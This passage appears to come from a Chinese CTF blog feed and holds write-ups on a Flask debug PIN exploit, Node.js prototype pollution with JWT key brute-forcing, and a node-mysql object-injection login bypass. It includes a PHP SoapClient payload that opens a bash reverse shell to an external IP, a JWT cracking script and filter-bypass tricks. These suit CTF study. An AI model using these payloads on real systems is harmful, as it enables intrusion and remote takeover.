class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python3 <span class="hljs-built_in">exp</span>.py --username app --modname flask.app --appname Flask --basefile /usr/lib/python3<span class="hljs-number">.8</span>/site-packages/flask/app.py --uuid <span class="hljs-number">2485378023426</span> --machineid <span class="hljs-number">349b3354</span>-f67f-<span class="hljs-number">4438</span>-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687<br></code></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218824.png" alt="image-20230714153646385"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Cookie</span>:  __wzdb2a60e2b19822632a67c=<span class="hljs-number">1689320197</span>|<span class="hljs-number">11</span>b8517fb9fb<br><span class="hljs-attribute">PIN</span>:  <span class="hljs-number">121</span>-<span class="hljs-number">260</span>-<span class="hljs-number">582</span><br></code></pre></td></tr></table></figure><p>通过soapclient去访问debug界面，同时也只有soapclient可以做到携带cookie访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).popen(&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.223.5.175/9080 &lt;&amp;1\&quot;&quot;)&amp;frm=0&amp;s=ECDJpSJ4XJ5AZJtaxMHT&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1689320197|11b8517fb9fb&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<br>                               <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt;<span class="hljs-string">&quot;sammy\r\n&quot;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$headers</span>),<br>                               <span class="hljs-string">&#x27;uri&#x27;</span>=&gt; <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span>));<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;properties&quot;</span>=&gt;<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>)));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>不知道什么原因现在反弹不了shell，试了好几天了，中间有一次好不容易反弹出来了但又不知道怎么搞的让我弄断了，太搞心态了😭😭😭。但是步骤就是这样。这题也就记录到这里了。看其他师傅的wp是说后面使用SUID提权读flag。</p><p>最后感谢Boogipop师傅的解惑</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一道nodejs污染+jwt爆破的题</title>
    <link href="/2023/07/01/%E4%B8%80%E9%81%93nodejs%E6%B1%A1%E6%9F%93+jwt%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/Nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/07/01/%E4%B8%80%E9%81%93nodejs%E6%B1%A1%E6%9F%93+jwt%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/Nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="Nodejs命令执行"><a href="#Nodejs命令执行" class="headerlink" title="Nodejs命令执行"></a>Nodejs命令执行</h2><p>又是复现其他师傅博客上的题目的一天~</p><p>这题的整体结构还是比较简单的，但是做的过程还是踩了不少的坑。</p><p><img src="/../../img/nodejs_image/1.png"></p><p>看起来需要获得admin权限</p><p>抓个包看一下</p><p><img src="/../../img/nodejs_image/2.png"></p><p>coockie部分看起来有点像JWT，理由是由三部分加密组成，且由点进行连接。</p><p>到jwt.io进行解密</p><p><img src="/../../img/nodejs_image/3.png"></p><p>尝试将guest改成admin再传入，然而还是不行。</p><p>可以推测这里是使用了密钥进行加密，这里对jwt弱密钥进行爆破，编写如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#jwtj加密key值爆破脚本</span><br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-comment">#在这里输入jwt token</span><br>jwt_str=<span class="hljs-string">&#x27;&#x27;</span><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;keys.txt&#x27;</span>)<span class="hljs-comment">#在这里指定字典文件</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>    <span class="hljs-keyword">try</span>:<br>        jwt.decode(jwt_str, verify=<span class="hljs-literal">True</span>, key=i, algorithms=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the key is &#x27;</span>+i)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> (jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;there are something wrong,but the key is&#x27;</span> + i)<span class="hljs-comment">#数据部分预定义字段错误,但是key是正确的</span><br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> jwt.exceptions.InvalidSignatureError:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;found no key&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../img/nodejs_image/4.png"></p><p>重新进行编码成功进入<code>/source</code>页面，里面是如下源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs Javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;jsonwebtoken&quot;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> jwt_secret = <span class="hljs-string">&quot;toor&quot;</span>;<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cookie-parser&quot;</span>);<br><span class="hljs-keyword">const</span> putil_merge = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;putil-merge&quot;</span>);<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Super</span> = &#123;&#125;;<br><br><span class="hljs-keyword">var</span> safecode = <span class="hljs-keyword">function</span> (<span class="hljs-params">code</span>) &#123;<br>  <span class="hljs-keyword">let</span> validInput =<br>    <span class="hljs-regexp">/global|mainModule|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/gi</span>;<br>  <span class="hljs-keyword">return</span> !validInput.<span class="hljs-title function_">test</span>(code);<br>&#125;;<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/code&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span> &amp;&amp; req.<span class="hljs-property">body</span>) &#123;<br>    <span class="hljs-title function_">putil_merge</span>(&#123;&#125;, req.<span class="hljs-property">body</span>, &#123; <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> &#125;);<br>  &#125;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;welcome to code&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/source&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  <span class="hljs-keyword">var</span> auth = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">auth</span>;<br>  jwt.<span class="hljs-title function_">verify</span>(auth, jwt_secret, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, decoded</span>) &#123;<br>    <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">user</span> === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>      res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&quot;/app.js&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;you are not admin&quot;</span>);<br>    &#125;<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/root&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span>);<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span> || req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span> === <span class="hljs-literal">undefined</span> || req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span> === <span class="hljs-literal">null</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;please input key&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Super</span>[<span class="hljs-string">&quot;userid&quot;</span>] === <span class="hljs-string">&quot;Superadmin&quot;</span> + req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">safecode</span>(code)) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;forbidden!&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-built_in">eval</span>(code));<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;You are not the Super&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  <span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&quot;guest&quot;</span> &#125;, jwt_secret, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&quot;HS256&quot;</span> &#125;);<br>  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&quot;auth &quot;</span>, token);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;Only admin can get source in /source&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server started on port 3000&quot;</span>));<br><br></code></pre></td></tr></table></figure><p>在<code>/root</code>路由下有一个eval函数可以执行命令，然而要进入eval函数的判断前提是<code>Super[&quot;userid&quot;] === &quot;Superadmin&quot;+req.body.key</code>和<code>key</code>值不为空</p><p>在往上在<code>code</code>路由下有一个<code>putil_merge</code>函数进行merge操作，可以推断这里要使用原型链污染。</p><p>这里现在<code>code</code>处污染<code>userid</code>的值，然后再在root下传入<code>key</code>和<code>code</code>的值便可以进行命令执行了。</p><p>原先我不知道<code>req.body.key</code> 这个参数可以用POST或者json直接传参赋值，还在想要如何污染才能绕过判断，所以在这里卡了一会。。。</p><p>其实在程序最上面那一部分就说明了可以使用json或者POST传参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Javascript">app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br></code></pre></td></tr></table></figure><p>卡住我的第二个点是我不知道<code>Super[&quot;userid&quot;]</code>其实就相当于<code>Super.userid</code>所以只要污染原型链上的<code>userid</code>就够了，在头几行也定义了说<code>Super</code>是一个空对象。这搞得我也想了一段时间要怎么去污染<code>Super[&quot;userid&quot;]</code>这个参数。。。</p><p>还有就是<code>Super[&quot;userid&quot;] === &quot;Superadmin&quot; + req.body.key</code>中的<code>&quot;Superadmin&quot; + req.body.key</code>其实就是简单的字符串拼接，当时也不知道自己是脑袋抽了还是怎么了，想不过来这个要怎么处理。。。</p><p>该清楚上面那些原理后，接着可以构造发包了。</p><p>首先是code路由下的构造</p><p><img src="/../../img/nodejs_image/5.png"></p><p>这里需要注意的是需要在请求头中加入<code>Content-type:application/json</code>,我一开始没有注意，把它加到<code>Accept</code>头里去了，整了半天才发下加错地方了。。。。</p><p>接着是root路由下的构造</p><p><img src="/../../img/nodejs_image/6.png"></p><p><code>key</code>值传入<code>zzz</code>与<code>Superadmin</code>拼接通过判断，同时<code>code</code>进行命令执行。</p><p>这里使用的是POST直接传参，所以要写成<code>Content-type:application/x-www-form-urlencoded</code></p><p>在源码处我们有注意到<code>code</code>其实是进行了正则匹配过滤，可以使用一些常见bypass进行绕过</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">16</span>进制编码<br><span class="hljs-built_in">unicode</span>编码<br>加号拼接<br>模板字符串<br><span class="hljs-built_in">concat</span>函数连接<br>base64编码<br></code></pre></td></tr></table></figure><p>在这里我是用的是16进制编码。另外我发现只有进行同步进程创建才可以成功执行命令。</p><p>最后在记录一个大坑，今天这个洞其实是个CVE，影响版本从1.0.0 到 3.6.6。而我一开始安装的putil-merge是3.10.10的版本，已经修复了该反序列化漏洞，卡了我一下午。。。。后面才发现是因为版本原因，下次也要多注意一点了。。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/237032#h2-0">nodejs中代码执行绕过的一些技巧-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="http://47.103.121.189/2022/08/19/node-js%E4%B8%80%E9%81%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%B8%A9%E5%9D%91%E8%AE%B0/">哈哈，骗你的！ヾ(ﾟ∀ﾟゞ)</a></p><p><a href="https://www.jianshu.com/p/acbb936e87df">https://www.jianshu.com/p/acbb936e87df</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D^3 CTF 2021 8-bit pub复现</title>
    <link href="/2023/06/28/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/06/28/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="D-3-CTF-2021-8-bit-pub复现"><a href="#D-3-CTF-2021-8-bit-pub复现" class="headerlink" title="D^3 CTF 2021 8-bit pub复现"></a>D^3 CTF 2021 8-bit pub复现</h3><p>这题是顺着群里师傅的链接摸到的，前前后后总共拖了三天才完成。。。。拖延症太难受了</p><p>github题目仓库：<a href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">CTFChallenges&#x2F;D3CTF2021&#x2F;8-bit_pub at main · crumbledwall&#x2F;CTFChallenges (github.com)</a></p><p>根据师傅所说比赛的时候是给了源码的，所以我们先从源码入手，github上直接拖下来的题目文件是给docker用的，这里要先输入<code>npm install</code>补全一些依赖库，到时候审计的时候用得上。</p><p><img src="/../../img/8-bit%20pub-images/1.png"></p><p>首先尝试注册登录，然而并没有什么卵用，题目需要你拿到admin的账号</p><p>在<code>route/index.js</code>处可以看到各个功能的路由，查看注册和登录的源码文件。</p><p>可以看到如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> sql.<span class="hljs-title function_">query</span>(<br>      <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,<br>      [username, password],<br>      <span class="hljs-keyword">function</span> (<span class="hljs-params">err, res</span>) &#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;error: &quot;</span>, err);<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(err, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(<span class="hljs-literal">null</span>, res);<br>        &#125;<br>      &#125;<br>    );<br>  &#125;,<br>&#125;;<br><br> <span class="hljs-attr">signup</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">username, password, done</span>) &#123;<br>    sql.<span class="hljs-title function_">query</span>(<br>      <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>,<br>      [username],<br>      <span class="hljs-keyword">function</span> (<span class="hljs-params">err, res</span>) &#123;<br>.......<br></code></pre></td></tr></table></figure><p>这里的sql语句使用了占位符，会对传进来的参数进行转义，所以没办法进行sql注入。</p><p>但是在node-mysql文档的末尾有这么一段话</p><blockquote><p><strong>注意：</strong>与预处理语句不同的是，<code>?</code>就算出现在注释或字符串里，也会被替换成对应的值。</p><p>不同类型的值会按不同的规则进行转义，规则如下：</p><ul><li>数字保持不变</li><li>布尔值会被转换为<code>true</code>&#x2F;<code>false</code></li><li>日期对象转换为<code>&#39;YYYY-mm-dd HH:ii:ss&#39;</code>字符串</li><li>Buffer对象会被转换为十六进制字符串，例如<code>X&#39;0fa5&#39;</code></li><li>字符串会被安全转义</li><li>数组会被转换为列表，例如<code>[&#39;a&#39;, &#39;b&#39;]</code>会被转换为<code>&#39;a&#39;, &#39;b&#39;</code></li><li>嵌套数组会被转换为分组列表(用于批量插入)，例如<code>[[&#39;a&#39;, &#39;b&#39;], [&#39;c&#39;, &#39;d&#39;]]</code>会被转换为<code>(&#39;a&#39;, &#39;b&#39;), (&#39;c&#39;, &#39;d&#39;)</code></li><li>具有<code>toSqlString</code>方法的对象会调用<code>.toSqlString()</code>，并将返回的值作为初始SQL。</li><li>对象上的可枚举属性会被转换为<code>key = &#39;val&#39;</code>键值对。如果属性值是一个函数，该属性会被忽略。如果属性值是对象，会对其调用toString()并将返回的值作为val。</li><li><code>undefined</code>&#x2F;<code>null</code>会转换为<code>NULL</code></li><li><code>NaN</code>&#x2F;<code>Infinity</code>保持不变。 MySQL目前并不支持。如果你强行插入这类值，将触发MySQL错误。</li></ul></blockquote><p>这里是利用了传入对象会被转换为`key`&#x3D;val的键值对的这个特性</p><p>所以这里的操作是要传入一个对象，使用的是json格式的数据</p><p>在后面嵌套两个password的原因是就是传入一个对象。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这样后台的查询语句是这样的,相当于构造了一个万能密码，SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】,【and】优先于【or】</p><p>sql查询语句如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span> = <span class="hljs-string">&#x27;admin&#x27;</span> AND password = `password` = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>在这里我本来有个疑惑，就是在传入对象的时候为什么不能再<code>username</code>那里也传入一组对象比如</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:admin</span>&#125;<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;password&quot;</span>:&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:true</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是经过尝试发现这样穿的话是不行的。后来问了其他师傅，在注册时传入上述的数据，然后进入数据库里面看了一下，发现如果传入的是对象的话解析之后传到数据库的内容都是NULL或者0，这样的话这句万能密码的sql语句就不能成立。</p><p><img src="/../../img/8-bit%20pub-images/2.png"></p><p>成功登陆之后我们可以直接跳转到admin页面</p><p><img src="/../../img/8-bit%20pub-images/3.png"></p><p>最早看到sql注入占位符的时候我以为是预编译，没办法注入（当然占位符也不能注入:（  ），所以我放弃了sql注入的想法，所以在这一步我原先的想法是去伪造session绕过身份验证去，因为我在通往admin的路由上看到还调用了auth.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> auth = <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-number">302</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendView</span>(<span class="hljs-string">&quot;forbidden.html&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Forbidden.&quot;</span> &#125;);<br>    &#125;<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = auth;<br></code></pre></td></tr></table></figure><p>这边验证的是<code>session.username</code>而<code>session.username</code>是从这里获得的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">signin</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  user.<span class="hljs-title function_">signin</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>, req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, result</span>) &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (result.<span class="hljs-property">length</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">session</span>)<br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = result[<span class="hljs-number">0</span>].<span class="hljs-property">username</span>;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Signin success.&quot;</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Username or password wrong.&quot;</span> 